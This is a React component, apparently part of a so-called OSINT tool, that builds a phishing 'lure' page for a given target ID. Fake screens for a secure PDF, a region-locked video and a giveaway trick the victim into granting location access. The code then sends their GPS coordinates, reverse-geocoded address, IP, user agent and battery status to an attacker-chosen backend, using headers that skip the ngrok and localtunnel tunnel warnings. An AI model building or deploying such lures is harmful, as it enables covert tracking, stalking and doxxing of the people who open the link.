
import React, { useEffect, useState } from 'react';
import { FileText, Video, Gift, Lock, AlertCircle } from 'lucide-react';

const LureCapture: React.FC = () => {
    const [status, setStatus] = useState<'lure' | 'capturing' | 'success' | 'error'>('lure');
    const [errorMessage, setErrorMessage] = useState('');
    
    // Get params
    const params = new URLSearchParams(window.location.search);
    const targetId = params.get('target_id');
    const lureType = params.get('type') || 'pdf_secure';
    const backendUrl = params.get('b') || ''; // Optional explicit backend URL

    const captureAndSave = async (gpsData: any = null) => {
        if (!targetId) return;
        
        setStatus('capturing');
        
        try {
            const ipResp = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResp.json();
            
            const battery: any = (navigator as any).getBattery ? await (navigator as any).getBattery().then((b: any) => ({
                level: Math.floor(b.level * 100),
                charging: b.charging ? 'true' : 'false'
            })) : null;

            let address = '';
            if (gpsData) {
                try {
                    const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${gpsData.lat}&lon=${gpsData.lng}`);
                    const data = await resp.json();
                    address = data.display_name || '';
                } catch (e) {}
            }

            console.log('[LURE] Attempting to save sting for target:', targetId);
            
            const apiUrl = backendUrl ? `${backendUrl}/api/sting` : '/api/sting';
            
            const response = await fetch(apiUrl, {
                method: 'POST',
                mode: 'cors',
                headers: { 
                    'Content-Type': 'application/json',
                    'ngrok-skip-browser-warning': 'true',
                    'bypass-tunnel-reminder': 'true'
                },
                body: JSON.stringify({
                    targetId,
                    ip: ipData.ip,
                    ua: navigator.userAgent,
                    hash: btoa(navigator.userAgent).substring(0, 12),
                    gps: gpsData,
                    battery,
                    address
                })
            });
            console.log('[LURE] Sting response:', response.status);
            
            setStatus('success');
        } catch (error: any) {
            console.error(error);
            setStatus('error');
            let msg = error.message;
            try {
                // Try to parse if it's our JSON formatted error
                const parsed = JSON.parse(msg);
                msg = parsed.error || msg;
            } catch (e) {}
            setErrorMessage(`Failed to verify: ${msg || 'Connection timeout. Please try again.'}`);
        }
    };

    const handleAction = () => {
        if (!navigator.geolocation) {
            captureAndSave();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                captureAndSave({
                    lat: pos.coords.latitude.toFixed(6),
                    lng: pos.coords.longitude.toFixed(6),
                    acc: pos.coords.accuracy.toFixed(1)
                });
            },
            (err) => {
                captureAndSave();
            }
        );
    };

    // Auto-capture silent data on load
    useEffect(() => {
        if (targetId) {
            // We could auto-capture IP/UA here silently, but we'll wait for the "lure" interaction for better success rates on GPS
        }
    }, [targetId]);

    if (!targetId) return null;

    if (status === 'success') {
        return (
            <div className="fixed inset-0 bg-white z-[9999] flex flex-col items-center justify-center p-8 text-center font-sans">
                <Lock size={48} className="text-blue-600 mb-4" />
                <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Verified</h1>
                <p className="text-gray-600">The content is now available. Redirecting...</p>
                <div className="mt-8 p-4 bg-gray-100 rounded-lg w-full max-w-sm">
                    <p className="text-xs text-gray-400">Loading Secure Container...</p>
                    <div className="h-1 bg-blue-600 w-1/2 mt-2 animate-pulse"></div>
                </div>
            </div>
        );
    }

    return (
        <div className="fixed inset-0 bg-gray-50 z-[9999] flex flex-col items-center justify-center p-4 font-sans overflow-y-auto">
            <div className="w-full max-w-md bg-white shadow-2xl rounded-2xl overflow-hidden">
                {lureType === 'pdf_secure' && (
                    <>
                        <div className="bg-blue-600 p-8 flex justify-center text-white">
                            <FileText size={64} />
                        </div>
                        <div className="p-8">
                            <h2 className="text-xl font-bold text-gray-900 mb-2">Secure Document Access</h2>
                            <p className="text-sm text-gray-600 mb-6">
                                This document is protected and region-locked. You must verify your current physical location to view this file.
                            </p>
                            <button 
                                onClick={handleAction}
                                disabled={status === 'capturing'}
                                className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all shadow-lg active:scale-95 disabled:opacity-50"
                            >
                                {status === 'capturing' ? 'Verifying...' : 'Unlock & View PDF'}
                            </button>
                        </div>
                    </>
                )}

                {lureType === 'geo_video' && (
                    <>
                        <div className="bg-red-600 p-8 flex justify-center text-white">
                            <Video size={64} />
                        </div>
                        <div className="p-8">
                            <h2 className="text-xl font-bold text-gray-900 mb-2">Region-Locked Video</h2>
                            <p className="text-sm text-gray-600 mb-6">
                                Due to broadcasting rights, this video is only available in specific regions. Please verify your location to proceed.
                            </p>
                            <button 
                                onClick={handleAction}
                                disabled={status === 'capturing'}
                                className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition-all shadow-lg active:scale-95 disabled:opacity-50"
                            >
                                {status === 'capturing' ? 'Verifying...' : 'Verify Region'}
                            </button>
                        </div>
                    </>
                )}

                {lureType === 'giveaway' && (
                    <>
                        <div className="bg-emerald-600 p-8 flex justify-center text-white">
                            <Gift size={64} />
                        </div>
                        <div className="p-8">
                            <h2 className="text-xl font-bold text-gray-900 mb-2">Local Giveaway Entry</h2>
                            <p className="text-sm text-gray-600 mb-6">
                                Congratulations! You are eligible for the local prize pool. Verify your residential city to claim your entry.
                            </p>
                            <button 
                                onClick={handleAction}
                                disabled={status === 'capturing'}
                                className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-xl transition-all shadow-lg active:scale-95 disabled:opacity-50"
                            >
                                {status === 'capturing' ? 'Verifying...' : 'Claim Entry'}
                            </button>
                        </div>
                    </>
                )}

                {status === 'error' && (
                    <div className="p-4 mx-8 mb-8 bg-red-50 border border-red-200 rounded-lg flex items-start gap-3">
                        <AlertCircle className="text-red-500 shrink-0" size={18} />
                        <span className="text-xs text-red-700">{errorMessage}</span>
                    </div>
                )}
                
                <div className="px-8 pb-8 text-center text-[10px] text-gray-400">
                    Protected by ShieldSync OSINT Verification Service
                </div>
            </div>
        </div>
    );
};

export default LureCapture;
